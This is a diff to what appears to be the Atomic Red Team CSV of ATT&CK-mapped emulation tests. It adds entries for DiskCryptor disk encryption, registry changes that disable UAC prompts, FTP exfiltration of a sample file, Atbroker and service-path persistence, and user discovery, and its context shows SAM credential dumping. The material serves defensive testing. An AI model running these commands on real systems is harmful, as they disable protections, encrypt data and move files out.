@@ -9773,6 +9773,25 @@ input_arguments.File_to_Encrypt_Location.type: path
 input_arguments.File_to_Encrypt_Location.default: $env:temp\test.txt
 
 "
+T1486,Data Encrypted for Impact,Data Encrypt Using DiskCryptor,44b68e11-9da2-4d45-a0d9-893dabd60f30,"DiskCryptor, an open source encryption utility, can be exploited by adversaries for encrypting all disk partitions, including system partitions. This tool was identified in a ransomware campaign, as reported on https://thedfirreport.com/2021/11/15/exchange-exploit-leads-to-domain-wide-ransomware/. The documentation for DiskCryptor can be found at https://github.com/DavidXanatos/DiskCryptor. During the installation process, running dcrypt.exe starts the encryption console. It's important to note that a system reboot is necessary as part of the installation.
+",windows,,,"""""%PROGRAMFILES%\dcrypt""\#{dcrypt_exe}""
+",command_prompt,True,,,powershell,"dependencies.0.description: dcrypt_setup will be installed at specified location (#{dcrypt_exe})
+
+dependencies.0.prereq_command: if (Test-Path ""${env:ProgramFiles}/dcrypt/#{dcrypt_exe}"") {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: Write-Host Downloading DiskCryptor installer
+New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://github.com/DavidXanatos/DiskCryptor/releases/download/1.1.846.118/dcrypt_setup_1.1.846.118.exe"" -OutFile      ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe""
+Write-Host Install DiskCryptor
+Start-Process ""PathToAtomicsFolder\..\ExternalPayloads\dcrypt_setup_1.1.846.118.exe"" -Wait -ArgumentList ""/s""
+
+","input_arguments.dcrypt_exe.description: The dcrypt.exe executable from dcrypt_setup.exe
+
+input_arguments.dcrypt_exe.type: path
+
+input_arguments.dcrypt_exe.default: dcrypt.exe
+
+"
 T1562.003,Impair Defenses: HISTCONTROL,Disable history collection,4eafdb45-0f79-4d66-aa86-a3e2c08791f5,"Disables history collection in shells
 ",linux,macos,,"export HISTCONTROL=ignoreboth
 #{evil_command}
@@ -12518,6 +12537,14 @@ This setting ensures that the elevation prompt is only used in secure desktop mo
 Disable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop to 0.
 ",windows,,,Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force,powershell,True,,"Set-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System -Name PromptOnSecureDesktop -Value 1 -Type Dword -Force
 ",,,
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable UAC notification via registry keys,160a7c77-b00e-4111-9e45-7c2a44eda3fd,"This atomic regarding UACDisableNotify pertains to the notification behavior of UAC. UAC is a critical security feature in Windows that prevents unauthorized changes to the operating system. It prompts the user for permission or an administrator password before allowing actions that could affect the system's operation or change settings that affect other users. The BlotchyQuasar RAT defense evasion activities that the adversary to disable UAC notifications makes it easier for malware and malicious software to execute with elevated privileges. [Article](https://securityintelligence.com/x-force/x-force-hive0129-targeting-financial-institutions-latam-banking-trojan/)
+",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 1 /f
+",command_prompt,,,"reg add ""HKLM\SOFTWARE\Microsoft\Security Center"" /v UACDisableNotify /t REG_DWORD /d 0 /f
+",,,
+T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,Disable ConsentPromptBehaviorAdmin via registry keys,a768aaa2-2442-475c-8990-69cf33af0f4e,"This atomic regarding setting ConsentPromptBehaviorAdmin to 0 configures the UAC so that it does not prompt for consent or credentials when actions requiring elevated privileges are performed by users in the administrators group. This means that any operation that would normally trigger a UAC prompt will proceed automatically without user interaction.
+",windows,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
+",command_prompt,,,"reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f
+",,,
 T1003.002,OS Credential Dumping: Security Account Manager,"Registry dump of SAM, creds, and secrets",5c2571d0-1572-416d-9676-812e64ca9f44,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
 via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
 
@@ -14505,6 +14532,31 @@ input_arguments.domain.type: url
 input_arguments.domain.default: https://google.com
 
 "
+T1020,Automated Exfiltration,Exfiltration via Encrypted FTP,5b380e96-b0ef-4072-8a8e-f194cb9eb9ac,"Simulates encrypted file transfer to an FTP server. For testing purposes, a free FTP testing portal is available at https://sftpcloud.io/tools/free-ftp-server, providing a temporary FTP server for 60 minutes. Use this service responsibly for testing and validation only.",windows,,,"$sampleData = ""Sample data for exfiltration test""
+Set-Content -Path ""#{sampleFile}"" -Value $sampleData
+$ftpUrl = ""#{ftpServer}""
+$creds = Get-Credential -Credential ""#{credentials}""
+Invoke-WebRequest -Uri $ftpUrl -Method Put -InFile ""#{sampleFile}"" -Credential $creds
+",powershell,False,,"Remove-Item -Path ""#{sampleFile}"" -ErrorAction Ignore
+",,,"input_arguments.sampleFile.description: Path of the sample file to exfiltrate.
+
+input_arguments.sampleFile.type: String
+
+input_arguments.sampleFile.default: C:\temp\T1020__FTP_sample.txt
+
+input_arguments.ftpServer.description: FTP server URL.
+
+input_arguments.ftpServer.type: Url
+
+input_arguments.ftpServer.default: ftp://example.com
+
+input_arguments.credentials.description: FTP server credentials.
+
+input_arguments.credentials.type: String
+
+input_arguments.credentials.default: [user:password]
+
+"
 T1136.001,Create Account: Local Account,Create a user account on a Linux system,40d8eabd-e394-46f6-8785-b9bfa1d011d2,"Create a user via useradd
 ",linux,,,"useradd -M -N -r -s /bin/bash -c evil_account #{username}
 ",bash,True,,"userdel #{username}
@@ -14774,6 +14826,19 @@ whoami.exe /all >> #{output_path}\$file
 input_arguments.output_path.type: string
 
 input_arguments.output_path.default: $env:temp
+
+"
+T1033,System Owner/User Discovery,System Owner/User Discovery Using Command Prompt,ba38e193-37a6-4c41-b214-61b33277fe36,Identify the system owner or current user using native Windows command prompt utilities.,windows,,,"set file=#{output_file_path}\user_info_%random%.tmp
+echo Username: %USERNAME% > %file%
+echo User Domain: %USERDOMAIN% >> %file%
+net users >> %file%
+query user >> %file%
+",command_prompt,False,,"del #{output_file_path}\\user_info_*.tmp
+",,,"input_arguments.output_file_path.description: Location of output file.
+
+input_arguments.output_file_path.type: string
+
+input_arguments.output_file_path.default: $env:temp
 
 "
 T1090.001,Proxy: Internal Proxy,Connection Proxy,0ac21132-4485-4212-a681-349e8a6637cd,"Enable traffic redirection.
@@ -18286,6 +18351,13 @@ icacls %windir%\system32\osk.exe /setowner ""NT SERVICE\TrustedInstaller""
 icacls %windir%\System32\osk.exe /grant ""NT SERVICE\TrustedInstaller"":F /t
 icacls %windir%\system32\osk.exe /grant:r SYSTEM:RX
 icacls %windir%\system32\osk.exe /grant:r Administrators:RX
+",,,
+T1546.008,Event Triggered Execution: Accessibility Features,Atbroker.exe (AT) Executes Arbitrary Command via Registry Key,444ff124-4c83-4e28-8df6-6efd3ece6bd4,"Executes code specified in the registry for a new AT (Assistive Technologies).
+",windows,,,"reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test""
+reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v TerminateOnDesktopSwitch /t REG_DWORD /d 0
+reg add ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test"" /v StartEXE /t REG_SZ /d C:\WINDOWS\system32\cmd.exe
+atbroker /start malware_test
+",command_prompt,,,"reg delete ""HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs\malware_test""
 ",,,
 T1558.004,Steal or Forge Kerberos Tickets: AS-REP Roasting,Rubeus asreproast,615bd568-2859-41b5-9aed-61f6a88e48dd,"Information on the Rubeus tool and it's creators found here: https://github.com/GhostPack/Rubeus#asreproast
 This build targets .NET 4.5.  If targeting a different version you will need to compile Rubeus
@@ -22511,7 +22583,8 @@ Upon successful execution, powershell will download `AtomicService.exe` from git
 ",windows,,,"sc.exe \\#{remote_host} create #{service_name} binPath= ""#{binary_path}"" start=#{startup_type} type=#{service_type}
 sc.exe \\#{remote_host} start #{service_name}
 ",command_prompt,True,,"sc.exe \\#{remote_host} stop #{service_name} >nul 2>&1
-sc.exe \\#{remote_host} delete #{service_name} >nul 2>&1",powershell,"dependencies.0.description: Service binary must exist on disk at specified location (#{binary_path})
+sc.exe \\#{remote_host} delete #{service_name} >nul 2>&1
+",powershell,"dependencies.0.description: Service binary must exist on disk at specified location (#{binary_path})
 
 dependencies.0.prereq_command: if (Test-Path ""#{binary_path}"") {exit 0} else {exit 1}
 
@@ -22547,6 +22620,31 @@ input_arguments.remote_host.description: Name of the remote endpoint
 input_arguments.remote_host.type: string
 
 input_arguments.remote_host.default: localhost
+
+"
+T1543.003,Create or Modify System Process: Windows Service,Modify Service to Run Arbitrary Binary (Powershell),1f896ce4-8070-4959-8a25-2658856a70c9,"This test will use PowerShell to temporarily modify a service to run an arbitrary executable by changing its binary path and will then revert the binary path change, restoring the service to its original state.
+This technique was previously observed through SnapMC's use of Powerspolit's invoke-serviceabuse function. 
+[Reference](https://blog.fox-it.com/2021/10/11/snapmc-skips-ransomware-steals-data/)
+",windows,,,"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
+set-servicebinarypath -name ""#{service_name}"" -path ""#{new_bin_path}""
+start-service -Name ""#{service_name}"" -erroraction silentlycontinue | out-null",powershell,True,,"Stop-Service -Name ""#{service_name}"" -force -erroraction silentlycontinue | Out-Null
+set-servicebinarypath -name ""#{service_name}"" -path ""#{original_bin_path}"" -erroraction silentlycontinue | out-null",,,"input_arguments.service_name.description: Name of the service to modify
+
+input_arguments.service_name.type: string
+
+input_arguments.service_name.default: fax
+
+input_arguments.new_bin_path.description: Path of the new service binary
+
+input_arguments.new_bin_path.type: String
+
+input_arguments.new_bin_path.default: $env:windir\system32\notepad.exe
+
+input_arguments.original_bin_path.description: Path of the original service binary
+
+input_arguments.original_bin_path.type: String
+
+input_arguments.original_bin_path.default: $env:windir\system32\fxssvc.exe
 
 "
 T1140,Deobfuscate/Decode Files or Information,Deobfuscate/Decode Files Or Information,dc6fe391-69e6-4506-bd06-ea5eeb4082f8,"Encode/Decode executable
